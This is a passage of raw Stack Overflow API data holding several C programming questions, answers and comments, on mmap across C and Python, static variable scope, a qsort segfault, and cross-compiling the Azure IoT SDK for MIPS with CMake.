1591573641, "question_id": 48790691, "link": "https://stackoverflow.com/questions/48790691/mmap-a-same-file-in-both-c-and-python-will-it-really-use-the-shared-memory-wil", "title": "mmap a same file in both C and Python, will it really use the shared memory? will mmap work across different programming languages?", "body": "<p>By doing the reading from C code and writing from python, I couldn't see in my C the changes that i am doing in python.</p>\n\n<p>Hence I would really like to know whether mmap work across language like C and Python or am I doing mistakes here, Please let me know.</p>\n\n<p>Reading from C Code:</p>\n\n<pre><code>#include &lt;sys/types.h&gt;\n#include &lt;sys/mman.h&gt;\n#include &lt;err.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;unistd.h&gt;\n\nint main(void)\n{\n    char *shared;\n    int fd = -1;\n    if ((fd = open(\"hello.txt\", O_RDWR, 0)) == -1) {\n        printf(\"unable to open\");\n        return 0;\n    }\n    shared = (char *)mmap(NULL, 1, PROT_READ|PROT_WRITE, MAP_ANON|MAP_SHARED, -1, 0);\n    printf(\"%c\\n\",shared[0]);\n}\n</code></pre>\n\n<h1>Writing from Python</h1>\n\n<pre><code>with open( \"hello.txt\", \"wb\" ) as fd:\n    fd.write(\"1\")\nwith open( \"hello.txt\", \"r+b\" ) as fd:\n    mm = mmap.mmap(fd.fileno(), 1, access=ACCESS_WRITE, offset=0)\n    print(\"content read from file\")\n    print(mm.readline())\n    mm[0] = \"0\"\n    print(\"content read from file\")\n    print(mm.readline())\n    mm.close()\n    fd.close()\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1518621971, "post_id": 48790558, "comment_id": 84583310, "body": "The sections don&#39;t store <i>names</i>, they store <i>values</i>."}, {"owner": {"reputation": 52685, "user_id": 980550, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/8emhY.jpg?s=128&g=1", "display_name": "lurker", "link": "https://stackoverflow.com/users/980550/lurker"}, "edited": false, "score": 0, "creation_date": 1518622246, "post_id": 48790558, "comment_id": 84583472, "body": "This is about variable <i>scope</i>. There are two values in memory that you&#39;ve named <code>var</code>. Any reference to <code>var</code> inside of the <code>main</code> block will be to the <code>var</code> you declared inside the <code>main</code> block due to scoping rules. If you had another function in this module, say <code>foo()</code> that referenced <code>var</code> but did not declare its own, it would be referencing the <code>var</code> you declared statically at the top of the module. The compiler knows how to generate the underlying code to sort this out."}], "answers": [{"comments": [{"owner": {"reputation": 4739, "user_id": 4745612, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1b8f0eb3ff209075ac07aabc64d2bde4?s=128&d=identicon&r=PG&f=1", "display_name": "Michi", "link": "https://stackoverflow.com/users/4745612/michi"}, "edited": false, "score": 0, "creation_date": 1518622475, "post_id": 48790795, "comment_id": 84583621, "body": "Yes but a good compiler should warn you about this."}], "tags": [], "owner": {"reputation": 28550, "user_id": 3796113, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/960488e3bdc769466c183faaf102f2f1?s=128&d=identicon&r=PG&f=1", "display_name": "user2736738", "link": "https://stackoverflow.com/users/3796113/user2736738"}, "is_accepted": false, "score": 1, "last_activity_date": 1518622510, "last_edit_date": 1518622510, "creation_date": 1518622309, "answer_id": 48790795, "question_id": 48790558, "link": "https://stackoverflow.com/questions/48790558/static-variable-storage-location/48790795#48790795", "title": "Static variable storage location", "body": "<p>Those two variable's even if stored in same section because of their same storage class specifier their scope will be different. That's how they are distinguished. We can make this also - you don't ask then if it alright or not</p>\n\n<pre><code>int main(void){\n  int a = 1;\n  {\n      int a = 2;\n  }\n}\n</code></pre>\n\n<p>Compiler in your case will try to find the variable <code>var</code> when used and will take the one which will be found first. Inside <code>main</code> the local <code>var</code> will be considered. But in other function without declaring any variable with same name if you refer <code>var</code> it will access the global one.</p>\n\n<p>And a good compiler will warn you about this <code>-Wshadow</code> option in <code>gcc</code> will tell you about this if you compile with this flag.</p>\n\n<p>The idea you should clear is that - there won't be any collision or redefinition of the same variable - it is different scope on which they are defined. </p>\n"}], "owner": {"reputation": 1, "user_id": 9360357, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2242762404c9ff1f43c0af0a4df6a219?s=128&d=identicon&r=PG&f=1", "display_name": "said", "link": "https://stackoverflow.com/users/9360357/said"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 47, "favorite_count": 0, "closed_date": 1518622463, "answer_count": 1, "score": 0, "last_activity_date": 1518622510, "creation_date": 1518621578, "last_edit_date": 1518622442, "question_id": 48790558, "link": "https://stackoverflow.com/questions/48790558/static-variable-storage-location", "closed_reason": "Duplicate", "title": "Static variable storage location", "body": "<p>If we create a static variable in global and local with  same name, means code is getting compiled. But i expected that it will give redefined error because static variables will be stored in data section memory, but we cant create two same variables in same data section. So why its getting compiled ? Actually where those two variables will be stored? please any one can you answer...</p>\n\n<p>This is example code i have used,</p>\n\n<pre><code>static int var = 100;\n\nvoid main()\n{\n    static int var = 200;\n    printf(\"\\n Var:%d\\n\", var);\n}\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 3612, "user_id": 1813336, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/1zONI.jpg?s=128&g=1", "display_name": "cleblanc", "link": "https://stackoverflow.com/users/1813336/cleblanc"}, "edited": false, "score": 1, "creation_date": 1518620679, "post_id": 48790201, "comment_id": 84582439, "body": "Where did you get that there were lines-1 items of length 10?"}, {"owner": {"reputation": 52685, "user_id": 980550, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/8emhY.jpg?s=128&g=1", "display_name": "lurker", "link": "https://stackoverflow.com/users/980550/lurker"}, "edited": false, "score": 0, "creation_date": 1518620760, "post_id": 48790201, "comment_id": 84582490, "body": "Read the documentation for <code>qsort</code>. Second argument is the number of elements in your array, which you have correct at <code>n_lines-1</code>. But the 3rd argument is the <i>size of an element</i>. What is an element? It is a pointer to <code>char</code> (a <code>char *</code>). What&#39;s the size of one of those? <code>sizeof(char *)</code>. Not 10. On a related note, I don&#39;t understand why you assigned: <code>dictionary=malloc(n_lines*sizeof(int*))</code>. That should be <code>sizeof(char *)</code> not <code>sizeof(int *)</code>, although the values are the same. And this is strange: <code>dictionary[i]=malloc(max_w_length*sizeof(int))</code>. Where does <code>int</code> come into play here?"}, {"owner": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "edited": false, "score": 1, "creation_date": 1518631258, "post_id": 48790201, "comment_id": 84589115, "body": "Welcome to Stack Overflow! Please <a href=\"https://stackoverflow.com/posts/48790201/edit\">edit</a> your code to reduce it to a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> of your problem.  Your current code includes much that is peripheral to your problem - a minimal sample normally looks similar to a good unit test: only performing one task, with input values specified for reproducibility."}, {"owner": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "edited": false, "score": 0, "creation_date": 1518631268, "post_id": 48790201, "comment_id": 84589118, "body": "Welcome to Stack Overflow! Please <a href=\"https://stackoverflow.com/posts/48790201/edit\">edit</a> your question to show us what kind of debugging you&#39;ve done.  I expect you to have run your <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> within Valgrind or a similar checker, and to have investigated with a debugger such as GDB, for example.  Ensure you&#39;ve enabled a full set of compiler warnings, too.  What did the tools tell you, and what information are they missing?  And read Eric Lippert&#39;s <a href=\"https://ericlippert.com/2014/03/05/how-to-debug-small-programs/\" rel=\"nofollow noreferrer\">How to debug small programs</a>."}], "answers": [{"tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": false, "score": 3, "last_activity_date": 1518620677, "creation_date": 1518620677, "answer_id": 48790276, "question_id": 48790201, "link": "https://stackoverflow.com/questions/48790201/semgentation-fault-because-of-strlen-while-sorting-string-matrix-with-qsort/48790276#48790276", "title": "semgentation fault because of strlen while sorting string matrix with qsort", "body": "<p>You're not passing the correct element size to <code>qsort</code>:</p>\n\n<pre><code>                       //  v------- here\nqsort(dictionary,n_lines-1,max_w_length ,compare);\n</code></pre>\n\n<p>Each element of your array is a <code>char *</code>, not an array of size <code>max_w_length</code>,  so use the size of that:</p>\n\n<pre><code>qsort(dictionary,n_lines-1,sizeof(char *),compare);\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": false, "score": 0, "last_activity_date": 1518625947, "last_edit_date": 1518625947, "creation_date": 1518624359, "answer_id": 48791466, "question_id": 48790201, "link": "https://stackoverflow.com/questions/48790201/semgentation-fault-because-of-strlen-while-sorting-string-matrix-with-qsort/48791466#48791466", "title": "semgentation fault because of strlen while sorting string matrix with qsort", "body": "<ol>\n<li><p><a href=\"https://stackoverflow.com/a/48790276/2410359\">@dbush</a> good answer identifies a problem: OP used the incorrect element size: <code>size</code> argument for <code>qsort(base, nmemb, size, compar)</code>.</p></li>\n<li><p>Code did not allocate space for a <code>'\\n'</code> nor a string's <em>null character</em>.</p></li>\n<li><p>Code used the wrong type in allocating.</p></li>\n<li><p>Brittle line count and line length calculation.</p></li>\n</ol>\n\n<p>Rather than try to use the size of the <em>type</em>, use the size of the referenced data.  This is easier to code right, review and maintain.</p>\n\n<pre><code>// qsort(dictionary,n_lines,max_w_length,compare);\n// qsort(dictionary,n_lines,sizeof (char *),compare);\nqsort(dictionary, n_lines, sizeof *dictionary, compare);\n// or \nqsort(dictionary, n_lines, sizeof dictionary[0], compare);\n</code></pre>\n\n<p>This idiom can be applied to <code>malloc()</code> also.</p>\n\n<pre><code>//                                        \n// if ((dictionary=malloc(n_lines*sizeof(int*)))==NULL){ \nif ((dictionary=malloc(n_lines * sizeof *dictionary)) == NULL){ \n\n  //                                                v-- wrong type\n  // if((dictionary[i]=malloc(max_w_length*sizeof(int)))==NULL){  \n  if((dictionary[i]=malloc(max_w_length*sizeof dictionary[i][0])) == NULL){  \n\n  // Use +2 to allocate needed string space\n  if((dictionary[i]=malloc((max_w_length+2)*sizeof dictionary[i][0])) == NULL){  \n\n  // fgets(dictionary[i],max_w_length,dict);\n  fgets(dictionary[i], max_w_length + 2, dict);\n</code></pre>\n\n<p>As <a href=\"https://stackoverflow.com/questions/48790201/semgentation-fault-because-of-strlen-while-sorting-string-matrix-with-qsort/48791466#comment84582490_48790201\">@lurker</a> commented, malloc used a type mis-matched point with <code>int *</code>, rather than <code>char *</code>.  Rarely are these of different size, but <em>could</em> be.  By using <code>sizeof *dictionary</code>, the type is moot as <code>sizeof *dictionary</code> is correct, regardless of what type it points to.</p>\n\n<hr>\n\n<p>OP's method of calculating line count and max line length fails should the last <em>line</em> of the file not end with a <code>'\\n'</code>.</p>\n\n<p>Alternative</p>\n\n<pre><code>int ch;  // use int, not char\nint previous = '\\n';\nwhile((ch=getc(dict)) != EOF){\n  if (previous == '\\n') {\n    n_lines++;\n  }\n  w_length++;\n  if (w_length&gt;max_w_length) {\n    max_w_length = w_length;\n  }\n  if (ch == '\\n') {\n    w_length = 0;\n  }\n  previous = ch;\n}\n</code></pre>\n\n<p>This <code>max_w_length</code> includes the <code>'\\n'</code> and so <code>max_w_length + 1</code> needed to allocate to save a <em>String</em> that can hold it.</p>\n"}, {"tags": [], "owner": {"reputation": 21, "user_id": 9360616, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-FVYhUonLoV8/AAAAAAAAAAI/AAAAAAAAEe8/UJ4cnX8tRUw/photo.jpg?sz=128", "display_name": "Nikos Galanis", "link": "https://stackoverflow.com/users/9360616/nikos-galanis"}, "is_accepted": false, "score": 0, "last_activity_date": 1518627756, "creation_date": 1518627756, "answer_id": 48792555, "question_id": 48790201, "link": "https://stackoverflow.com/questions/48790201/semgentation-fault-because-of-strlen-while-sorting-string-matrix-with-qsort/48792555#48792555", "title": "semgentation fault because of strlen while sorting string matrix with qsort", "body": "<p>Guys thanks for your answers, so my code now looks like that: </p>\n\n<pre><code>    #include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nint compare (const void * a, const void * b) {\n    size_t fa = strlen((const char *)a);\n    size_t fb = strlen((const char *)b);\n    return (fa &gt; fb) - (fa &lt; fb);\n}\n\nint main(int argc, const char * argv[]) {\n  FILE* dict;\n  char** dictionary;\n  int max_w_length=0,w_length,n_lines;\n  if ((dict = fopen(\"Words.txt\", \"r+\")) == NULL) {\n    printf(\"Error with given dictionary!\\n\");\n    return 1;\n  }\n  int ch;  \n  int previous = '\\n';\n  while((ch=getc(dict)) != EOF){\n    if (previous == '\\n') {\n      n_lines++;\n    }\n    w_length++;\n    if (w_length&gt;max_w_length) {\n      max_w_length = w_length;\n    }\n    if (ch == '\\n') {\n      w_length = 0;\n    }\n    previous = ch;\n  }\n  printf(\"%d\\n\",max_w_length );\n  rewind(dict); //return to the beggining of the dictionary file\n  if ((dictionary=malloc(n_lines*sizeof(char*)))==NULL){ //allocate space for the dictionary\n    printf(\"Not enough memory!\\n\");\n    return 1;\n  }\n    for(int i=0;i&lt;n_lines;i++){\n      if((dictionary[i]=malloc(max_w_length*sizeof(char)))==NULL){  //allocate space for the dictionary\n        printf(\"Not enough memory!\\n\");\n        return 1;\n      }\n      fgets(dictionary[i],max_w_length+2,dict);      //put the words in to the dictionary\n    }\n\n    qsort(dictionary,n_lines,sizeof(*dictionary),compare);\n    for(int i=0;i&lt;n_lines;i++){\n      printf(\"%s\",dictionary[i]);\n    }\n    return 0;\n}\n</code></pre>\n\n<p>so i dont get a segmentation, but when i run it the programm soes not sortt the words by their length, it doesnt do anything at all. Whtat could possibly be wrong?</p>\n"}], "owner": {"reputation": 21, "user_id": 9360616, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-FVYhUonLoV8/AAAAAAAAAAI/AAAAAAAAEe8/UJ4cnX8tRUw/photo.jpg?sz=128", "display_name": "Nikos Galanis", "link": "https://stackoverflow.com/users/9360616/nikos-galanis"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 4730, "favorite_count": 0, "closed_date": 1518634542, "answer_count": 3, "score": 2, "last_activity_date": 1557170302, "creation_date": 1518620456, "last_edit_date": 1557170302, "question_id": 48790201, "link": "https://stackoverflow.com/questions/48790201/semgentation-fault-because-of-strlen-while-sorting-string-matrix-with-qsort", "closed_reason": "Not suitable for this site", "title": "semgentation fault because of strlen while sorting string matrix with qsort", "body": "<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nint compare (const void * a, const void * b) {\n    size_t fa = strlen((const char *)a);\n    size_t fb = strlen((const char *)b);\n    return (fa &gt; fb) - (fa &lt; fb);\n}\n\nint main(int argc, const char * argv[]) {\n  FILE* dict;\n  char** dictionary,ch;\n  int max_w_length=0,w_length,n_lines;\n  if ((dict = fopen(\"Words1.txt\", \"r+\")) == NULL) {\n    printf(\"Error with given dictionary!\\n\");\n    return 1;\n  }\n  while((ch=getc(dict))!=EOF){\n    if (ch!='\\n') w_length++;\n    else {\n      n_lines++;\n      if (w_length&gt;max_w_length) max_w_length=w_length;\n      w_length=0;\n    }\n  }\n  printf(\"%d\\n\",max_w_length );\n  rewind(dict); //return to the beggining of the dictionary file\n  if ((dictionary=malloc(n_lines*sizeof(int*)))==NULL){ \n    printf(\"Not enough memory!\\n\");\n    return 1;\n  }\n    for(int i=0;i&lt;n_lines;i++){\n      if((dictionary[i]=malloc(max_w_length*sizeof(int)))==NULL){  \n        printf(\"Not enough memory for the crossword!\\n\");\n        return 1;\n      }\n      fgets(dictionary[i],max_w_length,dict);     \n    }\n\n    qsort(dictionary,n_lines,max_w_length,compare);\n    for(int i=0;i&lt;n_lines;i++){\n      printf(\"%s\\n\",dictionary[i]);\n    }\n    return 0;\n}\n</code></pre>\n\n<p>When compliling I get no warnings, but I get a segmentation fault while executing. When I run it with gdb debugger i get the following error: </p>\n\n<pre><code>Program received signal SIGSEGV, Segmentation fault.\n__strlen_avx2 () at ../sysdeps/x86_64/multiarch/strlen-avx2.S:62\n62  ../sysdeps/x86_64/multiarch/strlen-avx2.S: No such file or directory.\n</code></pre>\n\n<p>Any ideas for that?</p>\n"}, {"tags": ["c", "compilation", "mips", "axis", "toolchain"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1518620079, "post_id": 48790077, "comment_id": 84582010, "body": "You need a cross-compiler toolchain for MIPS. That&#39;s the suggestion."}, {"owner": {"reputation": 945, "user_id": 3010546, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/86c9f3c281b11e9d33e425927f37401a?s=128&d=identicon&r=PG&f=1", "display_name": "Kagemand Andersen", "link": "https://stackoverflow.com/users/3010546/kagemand-andersen"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1518621826, "post_id": 48790077, "comment_id": 84583212, "body": "Ah, of course. Good suggestion."}], "answers": [{"tags": [], "owner": {"reputation": 945, "user_id": 3010546, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/86c9f3c281b11e9d33e425927f37401a?s=128&d=identicon&r=PG&f=1", "display_name": "Kagemand Andersen", "link": "https://stackoverflow.com/users/3010546/kagemand-andersen"}, "is_accepted": true, "score": 0, "last_activity_date": 1519128841, "last_edit_date": 1519128841, "creation_date": 1518792469, "answer_id": 48829202, "question_id": 48790077, "link": "https://stackoverflow.com/questions/48790077/cmake-toolchain-for-32-bit-mips-processor/48829202#48829202", "title": "Cmake toolchain for 32-bit MIPS processor", "body": "<p>Figured out part of it. It cannot find OpenSSL because it's not in the specified root folder. Obvious enough, really. Required cloning the source and building using mips gcc and providing the path to its root as well.</p>\n\n<pre><code>SET(CMAKE_FIND_ROOT_PATH /path/to/mips/openssl /usr/local/mipsisa32r2el/r23)\n</code></pre>\n\n<p>Then the same thing for Curl. </p>\n\n<pre><code>SET(CMAKE_FIND_ROOT_PATH /path/to/mips/openssl /path/to/mips/curl /usr/local/mipsisa32r2el/r23)\n</code></pre>\n\n<p>And now I'm mostly back to where I started. Missing header files that I'm not entirely where I should place. A new issue, however, is when running the build script with the <code>--sysroot=/usr/local/mipsisa32r2el/r23</code> suffix, it fails at 0% citing that warnings are treated as errors. Considering this does not happen without the suffix, I can only assume it has something to do with the provided mips-related files and not the CMake files. </p>\n\n<p>EDIT: Managed to fix it and successfully build using the toolchain. </p>\n\n<p>Skipped the <code>sysroot</code> argument. Resolved an error about missing header files for <code>uuid</code>. </p>\n\n<p>At 22% I the following error, which was <a href=\"https://stackoverflow.com/questions/48869575/ld-cannot-find-luuid/48881612#48881612\">discussed and solved here.</a>. Short answer, built only uuid from util-linux.</p>\n\n<p>Finally, I was able to build via Cmake for my MIPS-32 device.</p>\n"}], "owner": {"reputation": 945, "user_id": 3010546, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/86c9f3c281b11e9d33e425927f37401a?s=128&d=identicon&r=PG&f=1", "display_name": "Kagemand Andersen", "link": "https://stackoverflow.com/users/3010546/kagemand-andersen"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 991, "favorite_count": 0, "accepted_answer_id": 48829202, "answer_count": 1, "score": 1, "last_activity_date": 1519128841, "creation_date": 1518620032, "last_edit_date": 1518792506, "question_id": 48790077, "link": "https://stackoverflow.com/questions/48790077/cmake-toolchain-for-32-bit-mips-processor", "title": "Cmake toolchain for 32-bit MIPS processor", "body": "<p>Need to run an Azure IoT SDK C sample on an Axis camera. Using the standard cmake to build the samples does not work, as they are compiled for 64-bit x86_84. Need it to be compiled to MIPS32.</p>\n\n<p>Eugene Sh. suggested making a toolchain file for it. I've written one now, but it fails at 16% with the following error: </p>\n\n<pre><code>[ 16%] /usr/bin/cmake: /usr/local/lib/libcurl.so.4: no version information available (required by /usr/bin/cmake)\nBuilding C object c-utility/CMakeFiles/aziotsharedutil.dir/adapters/uniqueid_linux.c.o\n/demo/azure-iot-sdk-c/c-utility/adapters/uniqueid_linux.c:7:23: fatal error: uuid/uuid.h: No such file or directory\ncompilation terminated.\nmake[2]: *** [c-utility/CMakeFiles/aziotsharedutil.dir/adapters/uniqueid_linux.c.o] Error 1\nmake[1]: *** [c-utility/CMakeFiles/aziotsharedutil.dir/all] Error 2\nmake: *** [all] Error 2\n</code></pre>\n\n<p>My toolchain file:</p>\n\n<pre><code>INCLUDE(CMakeForceCompiler)\n\nSET(CMAKE_SYSTEM_NAME Linux)     # this one is important\nSET(CMAKE_SYSTEM_VERSION 1)      # this one not so much\nSET(CMAKE_SYSTEM_PROCESSOR mips)\n\n# this is the location of the imps toolchain targeting the M1125\nSET(CMAKE_C_COMPILER /usr/local/mipsisa32r2el/r23/bin/mipsisa32r2el-axis-linux-gnu-gcc)\n\n# this is the file system root of the target\n#SET(CMAKE_FIND_ROOT_PATH /usr/local/mipsisa32r2el/r23)\n\n# search for programs in the build host directories\nSET(CMAKE_FIND_ROOT_PATH_MODE_PROGRAM NEVER)\n\n# for libraries and headers in the target directories\nSET(CMAKE_FIND_ROOT_PATH_MODE_PROGRAM ONLY)\nSET(CMAKE_FIND_ROOT_PATH_MODE_LIBRARY ONLY)\nSET(CMAKE_FIND_ROOT_PATH_MODE_INCLUDE ONLY)\n</code></pre>\n\n<p>And run it using \u00b4./build.sh --toolchain-file toolchain-mips.cmake`. </p>\n\n<p>If I run it as the <a href=\"https://github.com/Azure/azure-iot-sdk-c/blob/master/doc/SDK_cross_compile_example.md\" rel=\"nofollow noreferrer\">documentation</a> says, using -cl --sysroot=/usr/local/mipsisa32r2el/r23. I get errors that it cannot find OpenSSL and fails much earlier. </p>\n"}, {"tags": ["c++", "c", "arrays", "pointers"], "comments": [{"owner": {"reputation": 61304, "user_id": 4117728, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/66831ed13ffd9c497541220ec45c15c3?s=128&d=identicon&r=PG&f=1", "display_name": "largest_prime_is_463035818", "link": "https://stackoverflow.com/users/4117728/largest-prime-is-463035818"}, "edited": false, "score": 5, "creation_date": 1518619761, "post_id": 48789963, "comment_id": 84581767, "body": "first choose a language, second use <code>std::string</code> if you chose c++"}, {"owner": {"reputation": 23093, "user_id": 7359094, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/HxJgU.jpg?s=128&g=1", "display_name": "Fran&#231;ois Andrieux", "link": "https://stackoverflow.com/users/7359094/fran%c3%a7ois-andrieux"}, "reply_to_user": {"reputation": 61304, "user_id": 4117728, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/66831ed13ffd9c497541220ec45c15c3?s=128&d=identicon&r=PG&f=1", "display_name": "largest_prime_is_463035818", "link": "https://stackoverflow.com/users/4117728/largest-prime-is-463035818"}, "edited": false, "score": 0, "creation_date": 1518619977, "post_id": 48789963, "comment_id": 84581932, "body": "I&#39;m assuming @user463035818 meant that you should choose a programming language. c and c++ are very different languages, despite the apparent similarities. I don&#39;t think he meant you should choose a single speaking language. Since the question is about multilingual support, I thought it might be important to make that distinction."}, {"owner": {"reputation": 61304, "user_id": 4117728, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/66831ed13ffd9c497541220ec45c15c3?s=128&d=identicon&r=PG&f=1", "display_name": "largest_prime_is_463035818", "link": "https://stackoverflow.com/users/4117728/largest-prime-is-463035818"}, "edited": false, "score": 0, "creation_date": 1518620105, "post_id": 48789963, "comment_id": 84582026, "body": "... uff yes of course, missed that possible misunderstanding. I appreciate your efforts to support multiple languages, but when it comes to code you better pick one programming lanuage"}, {"owner": {"reputation": 308, "user_id": 8945252, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dd86e72a7d12c9b1a15e47da7e864bf2?s=128&d=identicon&r=PG&f=1", "display_name": "Light", "link": "https://stackoverflow.com/users/8945252/light"}, "edited": false, "score": 0, "creation_date": 1518620644, "post_id": 48789963, "comment_id": 84582424, "body": "It may be simpler to use a std::vector&lt;std::string&gt;&gt; then when you will need to access the data the only thing changing is the vector. (each vector corresponding to a language)"}, {"owner": {"reputation": 359, "user_id": 1649972, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/c73d3d11edb3caaa260a408af949d6c7?s=128&d=identicon&r=PG", "display_name": "user1649972", "link": "https://stackoverflow.com/users/1649972/user1649972"}, "edited": false, "score": 0, "creation_date": 1518710525, "post_id": 48789963, "comment_id": 84626250, "body": "Thanks for the comments, I am working on code that was written by someone else so I am tied down to using the char strings &amp; char string pointers, the char strings and their pointers, as well as some other arrays of pointers to those pointers are tied into the code in so many places (classes, methods, display/printing functions etc) that I cannot change how this works. I am simply trying to use what is there and implement the example above. Has anyone any idea on how I attack my issues with the idea above?, how to declare the langPtrs array correctly and how to write my single statement above?"}], "answers": [{"comments": [{"owner": {"reputation": 357695, "user_id": 560648, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/pBDFJ.jpg?s=128&g=1", "display_name": "Lightness Races in Orbit", "link": "https://stackoverflow.com/users/560648/lightness-races-in-orbit"}, "edited": false, "score": 2, "creation_date": 1518625240, "post_id": 48790152, "comment_id": 84585543, "body": "If C++, and you really want the pointers to refer to string literals directly, then you&#39;re going to have to put <code>const</code> in there. Probably not a terrible idea in C, either?"}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "reply_to_user": {"reputation": 357695, "user_id": 560648, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/pBDFJ.jpg?s=128&g=1", "display_name": "Lightness Races in Orbit", "link": "https://stackoverflow.com/users/560648/lightness-races-in-orbit"}, "edited": false, "score": 0, "creation_date": 1518625459, "post_id": 48790152, "comment_id": 84585686, "body": "@LightnessRacesinOrbit Good catch.  Fixed."}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1518679507, "post_id": 48790152, "comment_id": 84606246, "body": "Nice. However I tend to start such kind of enums like this: <code>enum langs {INVALID_LANGUAGE = -1,      LANG_ENGLISH, ...</code>"}, {"owner": {"reputation": 359, "user_id": 1649972, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/c73d3d11edb3caaa260a408af949d6c7?s=128&d=identicon&r=PG", "display_name": "user1649972", "link": "https://stackoverflow.com/users/1649972/user1649972"}, "edited": false, "score": 0, "creation_date": 1518710427, "post_id": 48790152, "comment_id": 84626174, "body": "Hi dbush , Thanks for the comment, I am actually already using enums for the indexs as you suggested in a lot of other places in my code, love the idea of the 2D array, it was actually something I was going to look into as the start and it completely slipped my mind, also thank you for the sample code I will 100% try to use implement it . My main issue is that I am working on code that was written by someone else so I am tied down to using the char strings and char string pointers, the char strings and their pointers, as well as some other arrays of pointers to those pointers (1 of 2)"}, {"owner": {"reputation": 359, "user_id": 1649972, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/c73d3d11edb3caaa260a408af949d6c7?s=128&d=identicon&r=PG", "display_name": "user1649972", "link": "https://stackoverflow.com/users/1649972/user1649972"}, "edited": false, "score": 0, "creation_date": 1518710432, "post_id": 48790152, "comment_id": 84626179, "body": "are tied into the code in so many places (classes, methods, display/printing functions etc) that it would be a nightmare to change how this works (although I will definitely try after reading your answer). In case I cannot manage to change the code due to the large amount of dependencies on how the strings are currently stored would you have any idea on how I attack my issues with my idea above?, how to declare the langPtrs array correctly and how to write my single statement above? (2 of 2)"}, {"owner": {"reputation": 158911, "user_id": 1687119, 